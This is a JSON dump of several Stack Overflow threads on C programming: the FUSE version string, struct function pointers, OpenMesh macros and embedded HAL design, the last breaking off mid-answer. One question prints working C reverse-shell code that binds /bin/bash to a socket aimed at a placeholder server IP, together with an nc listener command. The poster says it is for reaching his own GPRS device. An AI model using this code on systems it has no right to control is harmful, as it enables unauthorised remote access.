[{"comments": [{"owner": {"reputation": 7673, "user_id": 876937, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/6bc562fd4d7d98d1a2688ea44e196968?s=128&d=identicon&r=PG", "display_name": "Xophmeister", "link": "https://stackoverflow.com/users/876937/xophmeister"}, "edited": false, "score": 1, "creation_date": 1437643239, "post_id": 31568800, "comment_id": 51119049, "body": "As this is a static function, with no corresponding header, I guess one is forced to use the major.minor pattern. I wonder if they&#39;ll accept a patch :)"}, {"owner": {"reputation": 7673, "user_id": 876937, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/6bc562fd4d7d98d1a2688ea44e196968?s=128&d=identicon&r=PG", "display_name": "Xophmeister", "link": "https://stackoverflow.com/users/876937/xophmeister"}, "edited": false, "score": 1, "creation_date": 1438252382, "post_id": 31568800, "comment_id": 51379181, "body": "<a href=\"https://sourceforge.net/p/fuse/fuse/merge-requests/5/\" rel=\"nofollow noreferrer\">Merge request submitted</a> :)"}], "tags": [], "owner": {"reputation": 702, "user_id": 3560192, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/0TwaN.png?s=128&g=1", "display_name": "Alexguitar", "link": "https://stackoverflow.com/users/3560192/alexguitar"}, "is_accepted": false, "score": 2, "last_activity_date": 1437583862, "last_edit_date": 1437583862, "creation_date": 1437582309, "answer_id": 31568800, "question_id": 31567563, "link": "https://stackoverflow.com/questions/31567563/get-the-fuse-version-string/31568800#31568800", "title": "Get the FUSE version string", "body": "<p>In the source code of fuse in include/config.h you have:</p>\n\n<pre><code>/* Define to the version of this package. */\n#define PACKAGE_VERSION \"2.9.4\"\n</code></pre>\n\n<p>Additionally, there's a function in lib/helper.c that prints it.</p>\n\n<pre><code>static void helper_version(void)\n{\n    fprintf(stderr, \"FUSE library version: %s\\n\", PACKAGE_VERSION);\n}\n</code></pre>\n\n<p>Edit:</p>\n\n<p>I do realize that the package versioning strings are only for internal use so you're probably stuck with the major and minor numbers exposed by fuse_common.h . You'll probably have to write a function like @Jay suggests.</p>\n"}, {"tags": [], "owner": {"reputation": 9263, "user_id": 114979, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/fd94af0c2af6b774da12b4ad74a1d39f?s=128&d=identicon&r=PG", "display_name": "Jay", "link": "https://stackoverflow.com/users/114979/jay"}, "is_accepted": true, "score": 3, "last_activity_date": 1437584371, "last_edit_date": 1437584371, "creation_date": 1437583429, "answer_id": 31569176, "question_id": 31567563, "link": "https://stackoverflow.com/questions/31567563/get-the-fuse-version-string/31569176#31569176", "title": "Get the FUSE version string", "body": "<p>As you said yourself, the version is defined in <code>fuse_common.h</code>. If you don't want to use <code>helper_version</code>, as @Alexguitar said  you may just write a small program that does it -- but it seems that only the two first numbers (major and minor) are available:</p>\n\n<pre><code>#include &lt;fuse/fuse.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n\nchar* str_fuse_version(void) {\n    static char str[10] = {0,0,0,0,0,0,0,0,0,0};\n    if (str[0]==0) {\n        int v = fuse_version();\n        int a = v/10;\n        int b = v%10;\n        snprintf(str,10,\"%d.%d\",a,b); \n    }\n    return str;\n}\n\n\nint main () {\n    printf(\"%s\\n\", str_fuse_version());\n    exit(EXIT_SUCCESS);\n}\n</code></pre>\n\n<p>Note: you should include <code>fuse/fuse.h</code> and not <code>fuse_common.h</code>; also, you may need to pass <code>-D_FILE_OFFSET_BITS=64</code> when compiling.</p>\n\n<pre><code>$ gcc -Wall fuseversiontest.c -D_FILE_OFFSET_BITS=64  -lfuse\n\n$ ./a.out\n2.9\n</code></pre>\n"}], "owner": {"reputation": 7673, "user_id": 876937, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/6bc562fd4d7d98d1a2688ea44e196968?s=128&d=identicon&r=PG", "display_name": "Xophmeister", "link": "https://stackoverflow.com/users/876937/xophmeister"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 381, "favorite_count": 0, "accepted_answer_id": 31569176, "answer_count": 2, "score": 3, "last_activity_date": 1437584371, "creation_date": 1437578891, "question_id": 31567563, "link": "https://stackoverflow.com/questions/31567563/get-the-fuse-version-string", "title": "Get the FUSE version string", "body": "<p>Is there a function that returns the FUSE version string?</p>\n\n<p><code>fuse_common.h</code> has <code>int fuse_version(void)</code>, which returns the major version, multiplied by 10, plus the minor version; both of which are derived from <code>#define</code> values. (e.g., This returns <code>27</code> on my platform). What I'm looking for, however, is some <code>char* fuse_version(void)</code> that would return something like <code>2.7.3</code>.</p>\n"}, {"tags": ["c", "shell", "reverse", "scp"], "comments": [{"owner": {"reputation": 6028, "user_id": 1280954, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/Fe81g.jpg?s=128&g=1", "display_name": "Davide Berra", "link": "https://stackoverflow.com/users/1280954/davide-berra"}, "reply_to_user": {"reputation": 251753, "user_id": 129570, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/aa98a2c5baceef5ffcaf95fdde12b8fb?s=128&d=identicon&r=PG", "display_name": "Oliver Charlesworth", "link": "https://stackoverflow.com/users/129570/oliver-charlesworth"}, "edited": false, "score": 0, "creation_date": 1437580482, "post_id": 31567363, "comment_id": 51091535, "body": "doesn&#39;t work at all. connection is setup but no input/output"}], "answers": [{"tags": [], "owner": {"user_type": "does_not_exist", "display_name": "user2371524"}, "is_accepted": true, "score": 5, "last_activity_date": 1437585034, "creation_date": 1437585034, "answer_id": 31569715, "question_id": 31567363, "link": "https://stackoverflow.com/questions/31567363/c-reverse-shell-issues/31569715#31569715", "title": "C reverse shell issues", "body": "<p>The problem is that your shell only gets a plain file descriptor. With that, it can only operate like executing a script. To operate interactively, it needs a terminal allowing it to do all the <em>termios</em> stuff. This is what pseudo-terminals (<code>pty</code>) are for. A quick google search brought up <a href=\"http://rachid.koucha.free.fr/tech_corner/pty_pdip.html\" rel=\"noreferrer\">this guide</a>, I didn't read it entirely, maybe there are better sources -- good luck.</p>\n\n<p>PS: I have no experience with <code>pty</code>s, so this could be wrong, but I <em>assume</em> you should somehow set the <code>TERM</code> environment variable on the client side to that of the server before starting the shell, so it would be advisable to implement your own server (instead of <code>nc</code>) and have a little initialization protocol bevore starting the shell.</p>\n"}], "owner": {"reputation": 6028, "user_id": 1280954, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/Fe81g.jpg?s=128&g=1", "display_name": "Davide Berra", "link": "https://stackoverflow.com/users/1280954/davide-berra"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 709, "favorite_count": 2, "accepted_answer_id": 31569715, "answer_count": 1, "score": 4, "last_activity_date": 1437585034, "creation_date": 1437578394, "question_id": 31567363, "link": "https://stackoverflow.com/questions/31567363/c-reverse-shell-issues", "title": "C reverse shell issues", "body": "<p>I need to setup a reverse shell in order to connect to a device that is connected to the internet through a GPRS modem.</p>\n\n<p>When special conditions occours, i start this command on a public server with fixed ip</p>\n\n<pre><code>nc -l 65535\n</code></pre>\n\n<p>then i'll make this code run (now i'm directly connected to the device through a cable for test purposes) (and yes, the fork is useless in this case but i'll need it in my final scenario, so i kept it)</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdint.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/types.h&gt;\n#include &lt;sys/socket.h&gt;\n#include &lt;netinet/in.h&gt;\n\nint reverse_shell()\n{\n    pid_t p = 0;\n\n    /* fork */\n    p = fork();\n\n    if (p == 0)\n    {\n        char *shell[2];\n\n        int i,fd;\n        struct sockaddr_in sin;\n\n        /* open socket */\n        fd = socket(AF_INET, SOCK_STREAM, 0);\n        sin.sin_family = AF_INET;\n        sin.sin_addr.s_addr = inet_addr(\"MY SERVER PUBLIC IP ADDRESS\");\n        sin.sin_port = htons(65535);\n\n        /* connect! */\n        connect(fd, (struct sockaddr *)&amp;sin,sizeof(struct sockaddr_in));\n\n        /* assign three first fd (input/output/err) to open socket */\n        for(i=0; i&lt;3; i++)\n            dup2(fd, i);\n\n        /* build array */\n        shell[0] = \"/bin/bash\";\n        shell[1] = 0;\n\n        /* start the reverse shell */\n        if (execve(shell[0], shell, NULL) == -1)\n            printf(\"error\\n\");\n\n        exit(0);\n    }\n\n    return 0;\n}\n\nint main()\n{\n    reverse_shell();\n}\n</code></pre>\n\n<p>The reverse shell is setup but, as you can see, i got no prompt and it's looking a bit confusing. </p>\n\n<pre><code>[root@public-server tmp]# nc -lv 65535\nConnection from yyy.yyy.yyy.yyy port 65535 [tcp/*] accepted\ncd /etc\nls *hosts*\nhosts\nhosts.allow\nhosts.deny\n</code></pre>\n\n<p>Plus, i need to use <code>scp</code> but messages keep on appearing on device prompt and not on reverse-connected server</p>\n\n<p><strong>reverse-connected server:</strong></p>\n\n<pre><code>[root@public-server tmp]# nc -lv 65535\nConnection from yyy.yyy.yyy.yyy port 65535 [tcp/*] accepted\nls /etc/hosts\n/etc/hosts\nscp /etc/hosts xxx.xxx.xxx.xxx:/tmp/\nHost key verification failed.\nlost connection\n</code></pre>\n\n<p><strong>device prompt:</strong></p>\n\n<pre><code>root@device:/tmp# ./a.out\nroot@device:/tmp# The authenticity of host 'xxx.xxx.xxx.xxx (xxx.xxx.xxx.xxx)' can't be established.\nRSA key fingerprint is aa:e6:aa:1d:aa:a5:c2:fd:aa:4c:4f:e7:aa:34:aa:78.\nAre you sure you want to continue connecting (yes/no)?\n</code></pre>\n\n<p>What can i do to fix this and obtain a stable and usable reverse shell?</p>\n"}, {"tags": ["c", "pointers", "struct", "segmentation-fault"], "comments": [{"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 0, "creation_date": 1437577533, "post_id": 31566927, "comment_id": 51089286, "body": "What do you think is called with <code>parent.NewChild()</code>?"}], "answers": [{"comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 2, "creation_date": 1437577610, "post_id": 31567034, "comment_id": 51089348, "body": "And I would point the fact that <code>child-&gt;name = &quot;foo&quot;;</code> is probably not doing what is actually intended."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1437577841, "post_id": 31567034, "comment_id": 51089539, "body": "BTW, the <code>&amp;</code> is not needed."}, {"owner": {"reputation": 5463, "user_id": 3198247, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/8b74cda6fdfa7637a602efabf115f02f?s=128&d=identicon&r=PG&f=1", "display_name": "anderas", "link": "https://stackoverflow.com/users/3198247/anderas"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1437578010, "post_id": 31567034, "comment_id": 51089693, "body": "@EugeneSh. Thanks, removed it. Is it just not needed or actually wrong?(Haven&#39;t done any real C programming for a while, only C++)..."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1437578076, "post_id": 31567034, "comment_id": 51089739, "body": "See <a href=\"http://stackoverflow.com/questions/9552663/function-pointers-and-address-of-a-function\">here</a>. Or in the nutshell, it&#39;s the same"}, {"owner": {"reputation": 1648, "user_id": 252525, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/422a06312e3faa6319f5787370438194?s=128&d=identicon&r=PG", "display_name": "jonathanberi", "link": "https://stackoverflow.com/users/252525/jonathanberi"}, "edited": false, "score": 0, "creation_date": 1437578092, "post_id": 31567034, "comment_id": 51089755, "body": "Hmm, that doesn&#39;t seem to work. I&#39;m getting incompatible types: <code>incompatible pointer types assigning to &#39;Child (*)()&#39; from &#39;Child *(*)()&#39; parent.NewChild = &amp;NewChild;</code> &amp; &#39;initializing &#39;Child *&#39; (aka &#39;struct child_t *&#39;) with an expression of incompatible type &#39;Child&#39; (aka &#39;struct child_t&#39;)   Child *child = parent.NewChild();`"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 2, "creation_date": 1437578264, "post_id": 31567034, "comment_id": 51089895, "body": "I think it should be <code>Child* (*NewChild)();</code> in the <code>parent</code> type definition."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 0, "creation_date": 1437578409, "post_id": 31567034, "comment_id": 51090001, "body": "<code>Child *NewChild()</code> returns <code>Child *</code> but <code>Child (*NewChild)()</code> is defined as a function pointer to a function returning <code>Child</code>.  It should be <code>Child *(*NewChild)()</code>"}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1437578436, "post_id": 31567034, "comment_id": 51090028, "body": "@EugeneSh. - Beat me to it."}], "tags": [], "owner": {"reputation": 5463, "user_id": 3198247, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/8b74cda6fdfa7637a602efabf115f02f?s=128&d=identicon&r=PG&f=1", "display_name": "anderas", "link": "https://stackoverflow.com/users/3198247/anderas"}, "is_accepted": false, "score": 9, "last_activity_date": 1444743504, "last_edit_date": 1444743504, "creation_date": 1437577553, "answer_id": 31567034, "question_id": 31566927, "link": "https://stackoverflow.com/questions/31566927/segmentation-fault-11-when-returning-stuct-via-function-pointer-in-struct/31567034#31567034", "title": "Segmentation fault: 11 when returning stuct via function pointer in struct", "body": "<p>It seems like you haven't initialized <code>parent.NewChild</code>. Try setting that to the function pointer before calling it, like this: <code>parent.NewChild = NewChild;</code>. </p>\n\n<p>Also, aren't you missing the <code>*</code> in <code>Child *child = parent.NewChild();</code>?</p>\n\n<p>Addendum: By the comments, there is also an error/conflict in the declaration of <code>Parent</code>:\nIts <code>NewChild</code> member function is declared to return a <code>Child</code>, while the free method <code>NewChild</code> returns a <code>Child*</code>. So declare the member function pointer as <code>Child * (*NewChild)();</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "is_accepted": true, "score": 3, "last_activity_date": 1437578768, "last_edit_date": 1437578768, "creation_date": 1437578395, "answer_id": 31567365, "question_id": 31566927, "link": "https://stackoverflow.com/questions/31566927/segmentation-fault-11-when-returning-stuct-via-function-pointer-in-struct/31567365#31567365", "title": "Segmentation fault: 11 when returning stuct via function pointer in struct", "body": "<p>I think you mean the following</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\ntypedef struct child_t {\n\n  char *name;\n\n} Child;\n\ntypedef struct parent_t {\n\n    Child * ( *NewChild )( void );\n\n} Parent;\n\nChild * NewChild( void ) \n{\n    Child *child = malloc( sizeof( Child ) );\n\n    child-&gt;name = \"foo\";\n\n    return child;\n}\n\nint main( void )\n{\n    Parent parent = { NewChild };\n\n    Child *child = parent.NewChild();\n\n    puts( child-&gt;name );\n\n    free( child );\n}    \n</code></pre>\n\n<p>The program output is </p>\n\n<pre><code>foo\n</code></pre>\n\n<p>That is you should declare the function correctly. Its return type must be a pointer. So you must to declare the function pointer correctly in the structure definition</p>\n\n<pre><code>typedef struct parent_t {\n\n  Child (*NewChild)();\n  ^^^^^^\n} Parent;\n</code></pre>\n\n<p>And you need to initialize the object of type Parent.</p>\n\n<pre><code>Parent parent = { NewChild };\n</code></pre>\n\n<p>otherwise it has an indeterminate value.</p>\n"}, {"tags": [], "owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "is_accepted": false, "score": 1, "last_activity_date": 1437578843, "creation_date": 1437578843, "answer_id": 31567546, "question_id": 31566927, "link": "https://stackoverflow.com/questions/31566927/segmentation-fault-11-when-returning-stuct-via-function-pointer-in-struct/31567546#31567546", "title": "Segmentation fault: 11 when returning stuct via function pointer in struct", "body": "<p>I see the following problems in your code.</p>\n\n<p><strong>Mismatching function and function pointer</strong></p>\n\n<p>In <code>Parent</code>, you have defined <code>NewChild</code> as:</p>\n\n<pre><code>Child (*NewChild)();\n</code></pre>\n\n<p>That says <code>NewChild</code> is a pointer to a function that takes no arguments and returns a <code>Child</code> object.</p>\n\n<p>The function that you have defined:</p>\n\n<pre><code>Child *NewChild() { ...\n</code></pre>\n\n<p>Takes no arguments and returns a pointer to a <code>Child</code>, not an object of <code>Child</code>.</p>\n\n<p>You'll have to decide which one needs to be fixed. To fix the function, make its return type <code>Child</code>.</p>\n\n<pre><code>Child NewChild() { ...\n</code></pre>\n\n<p><strong>Uninitialized <code>Child</code> of <code>parent</code></strong></p>\n\n<p>You have left the value of <code>parent.Child</code> uninitialized yet you are trying to use it.</p>\n\n<p><strong>Setting the member of <code>Child</code></strong></p>\n\n<p>You use the following code to set the <code>name</code> of <code>child</code>.</p>\n\n<pre><code>child-&gt;name = \"foo\";\n</code></pre>\n\n<p>This may or may not be a problem depending on how you use <code>child-&gt;name</code> since <code>child-&gt;name</code> points to some global data in the computers read-only memory. It will be better to make a copy of <code>\"foo\"</code>.</p>\n\n<p>Here's my suggestion for updating your code:</p>\n\n<pre><code>Child NewChild() \n{\n   Child child;\n\n   // strdup is available on some platforms but it can \n   // be implemented easily.\n   child-&gt;name = strdup(\"foo\");\n\n   return child;\n}\n\nint main()\n{\n   Parent parent;\n   parent.NewChild = NewChild;\n\n   Child child = parent.NewChild();\n}\n</code></pre>\n"}], "owner": {"reputation": 1648, "user_id": 252525, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/422a06312e3faa6319f5787370438194?s=128&d=identicon&r=PG", "display_name": "jonathanberi", "link": "https://stackoverflow.com/users/252525/jonathanberi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 347, "favorite_count": 0, "accepted_answer_id": 31567365, "answer_count": 3, "score": 5, "last_activity_date": 1444743504, "creation_date": 1437577307, "question_id": 31566927, "link": "https://stackoverflow.com/questions/31566927/segmentation-fault-11-when-returning-stuct-via-function-pointer-in-struct", "title": "Segmentation fault: 11 when returning stuct via function pointer in struct", "body": "<p>I'm trying to emulate a constructor. I'm attempting to do this by having a parent Struct have a function pointer that returns a pointer to a child struct. Any help would be much appreciated.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include \"stdlib.h\"\n\ntypedef struct child_t {\n\n  char *name;\n\n} Child;\n\ntypedef struct parent_t {\n\n  Child (*NewChild)();\n\n} Parent;\n\nChild *NewChild() {\n  Child *child = malloc(sizeof(Child));\n\n  child-&gt;name = \"foo\";\n\n  return child;\n}\n\nint \nmain()\n{\n  Parent parent;\n\n  Child child = parent.NewChild();\n}\n</code></pre>\n"}, {"tags": ["c++", "c", "macros"], "comments": [{"owner": {"reputation": 8946, "user_id": 4374739, "user_type": "registered", "accept_rate": 97, "profile_image": "https://www.gravatar.com/avatar/292ca74d572d7871fbae034b12ace389?s=128&d=identicon&r=PG", "display_name": "SuperBiasedMan", "link": "https://stackoverflow.com/users/4374739/superbiasedman"}, "edited": false, "score": 0, "creation_date": 1437576724, "post_id": 31566170, "comment_id": 51088671, "body": "Please post the code you&#39;ve written, it&#39;s usually not possible to answer a question without seeing your code."}], "answers": [{"tags": [], "owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "is_accepted": false, "score": 0, "last_activity_date": 1437575982, "creation_date": 1437575982, "answer_id": 31566367, "question_id": 31566170, "link": "https://stackoverflow.com/questions/31566170/openmesh-does-not-compile-with-min-max-macros-active/31566367#31566367", "title": "OpenMesh does not compile with min/max macros active", "body": "<p>You should add</p>\n\n<pre><code>#ifdef min\n#undef min\n#endif\n</code></pre>\n\n<p>and similar for <code>max</code> before including the OpenMesh headers.</p>\n\n<p>Some header not observing NOMINMAX is defining them.</p>\n\n<p>If that breaks other code that relies on those macros, then use the more complicated</p>\n\n<pre><code>#ifdef min\n#define foo min\n#undef min\n#endif\n/*OpenMesh includes here*/\n#ifdef foo\n#define min foo\n#undef foo\n#endif\n</code></pre>\n\n<p>where <code>foo</code> is a symbol of your choosing.</p>\n"}], "owner": {"reputation": 33, "user_id": 3987251, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a758a6085e8bb8eddd2134b57bb3c8ce?s=128&d=identicon&r=PG&f=1", "display_name": "Lee David", "link": "https://stackoverflow.com/users/3987251/lee-david"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 328, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1437575982, "creation_date": 1437575504, "last_edit_date": 1437575612, "question_id": 31566170, "link": "https://stackoverflow.com/questions/31566170/openmesh-does-not-compile-with-min-max-macros-active", "title": "OpenMesh does not compile with min/max macros active", "body": "<p>How can I deal with this error? I add NOMINMAX to the Preprocessor Definitions, but it just dose not work. So what is the solution?</p>\n\n<p>the error is as follows.</p>\n\n<pre><code>ClCompile:\n1&gt;  tricall.c\n1&gt;  Detected min macro! OpenMesh does not compile with min/max macros active! Please add a define NOMINMAX to your compiler flags or add #undef min before including OpenMesh headers !\n1&gt;d:\\programfiles\\c_library\\openmesh3.2\\include\\openmesh\\core\\system\\config.h(72): fatal error C1189: #error :  min macro active\n</code></pre>\n"}, {"tags": ["c", "embedded", "software-design"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1437576473, "post_id": 31565858, "comment_id": 51088473, "body": "There is no language &quot;C/C++&quot;. However, even for a single language, it is far too broad. Do some research on your own."}, {"owner": {"reputation": 15295, "user_id": 3436922, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y8KQX.jpg?s=128&g=1", "display_name": "LPs", "link": "https://stackoverflow.com/users/3436922/lps"}, "edited": false, "score": 1, "creation_date": 1437577135, "post_id": 31565858, "comment_id": 51088996, "body": "As you wrote, BSP refers to board, not to SoC/MPU. Anyway this question  is too broad"}, {"owner": {"reputation": 118, "user_id": 5143985, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/4xd9Q.jpg?s=128&g=1", "display_name": "joosts", "link": "https://stackoverflow.com/users/5143985/joosts"}, "edited": false, "score": 0, "creation_date": 1437577821, "post_id": 31565858, "comment_id": 51089524, "body": "Thanks for your response, and my apologies if this (first) question is overly broad. Am I correct to see that I should also put all external-device related code in my BSP-package?"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1437579979, "post_id": 31565858, "comment_id": 51091146, "body": "It also might be specific to the OS you are writing for. For example if you are writing for a custom embedded Linux, there is a very well defined structure."}, {"owner": {"reputation": 7587, "user_id": 943010, "user_type": "registered", "accept_rate": 60, "profile_image": "https://i.stack.imgur.com/R7Q27.png?s=128&g=1", "display_name": "kdopen", "link": "https://stackoverflow.com/users/943010/kdopen"}, "edited": false, "score": 1, "creation_date": 1437580452, "post_id": 31565858, "comment_id": 51091508, "body": "Not to mention if you are targeting a microcontroller"}, {"owner": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 1, "creation_date": 1437603900, "post_id": 31565858, "comment_id": 51104997, "body": "He did precisely specify his OS, Eugene: none. There are common ways to organize such projects, but some are very chip-specific. For example, embedded ARM projects often use a standard called CMSIS, while others rely on libraries and tools from the manufacturer."}], "answers": [{"tags": [], "owner": {"reputation": 1083, "user_id": 5147212, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cd0948323093255d680801e7fcbc7965?s=128&d=identicon&r=PG&f=1", "display_name": "Sigve Kolbeinson", "link": "https://stackoverflow.com/users/5147212/sigve-kolbeinson"}, "is_accepted": true, "score": 3, "last_activity_date": 1437772326, "creation_date": 1437772326, "answer_id": 31619851, "question_id": 31565858, "link": "https://stackoverflow.com/questions/31565858/how-to-structure-source-code-for-embedded-software/31619851#31619851", "title": "How to structure source code for embedded software", "body": "<p>According to the <a href=\"https://en.wikipedia.org/wiki/Board_support_package\" rel=\"nofollow\">wikipedia entry for BSP</a>, its purpose is to provide the board support (not just micro) required by a specific OS. So for the same hardware, different OS will likely require different BSPs, so I don't think that's the term you're after.</p>\n\n<p>What you describe is what I would call a Hardware Abstraction Layer/HAL, and I believe this is a quite common name. In principle, this name could include the whole PCB, or only the MCU.</p>\n\n<p>The important bit in a HAL is the Abstraction. A good abstraction will make it easy to replace, e.g. if you want to test code built on top of the HAL off-target. It will also make it easier to port that code to a different hardware platform.</p>\n\n<p>I find many vendor-provided libraries fall short in this regard: You may call a function instead of modifying or reading registers directly, but the function call often corresponds directly to registers. That is, their library may hide behind the abstraction the compiler extensions necessary to interface with the chip, but not much else. Because of this, I tend to not use the vendor-provided library as a HAL, but may use it to implement one (or just access registers directly instead)</p>\n\n<hr>\n\n<p>The optimal structure for a HAL depends on your design goals. You've stated one goal of being able to debug your application off-target. You've also stated that you don't plan to run an OS. You may be planning to support a single MCU or MCU family, or multiple MCUs from different vendors. You may be planning a single board design, or multiple bespoke boards based on a common platform. These will all affect the design choices in a HAL design.</p>\n\n<hr>\n\n<p>I often work on projects that don't use an RTOS. Typically the hardware inherits some aspects from one or more older designs and has some new stuff. The new stuff can be small or big changes (including different MCU or MCU families).</p>\n\n<p>In this context, my approach to HAL has developed into the following:</p>\n\n<ol>\n<li><p>Define an API for each component in the HAL, (typically structs of pointers-to-function, such as <code>adc_driver_api_t</code>, <code>uart_driver_api_t</code>, <code>i2c_driver_api_t</code> etc.). These APIs do not use any chip/compiler extensions or includes, but typically adhere to a language standard (C89/C99). </p></li>\n<li><p>The HAL for a given platform provides implementations for these, e.g.  <code>msp430_adc12_driver</code>, <code>msp430_adc10_driver</code>, <code>pic18_adc12_driver</code>, <code>avr_adc_driver</code> etc all implements the <code>adc_driver_api_t</code> interface using different peripherals available on the respective platforms. Each implementation expose a const global instance of the implemented driver in the implementation header file, e.g. (using C) <code>extern const adc_driver_api_t msp430_adc12_driver;</code>. These implementations use chip/compiler extensions or includes as required.</p></li>\n<li><p>A component using the HAL to get ADC readings would be initialised with a <code>const adc_driver_api_t *</code> implementation and anything else the API requires (perhaps an adc channel). The component and the ADC driver implementation would both be initialised and connected together in the program initialisation, e.g. top of <code>main()</code></p></li>\n<li><p>I try 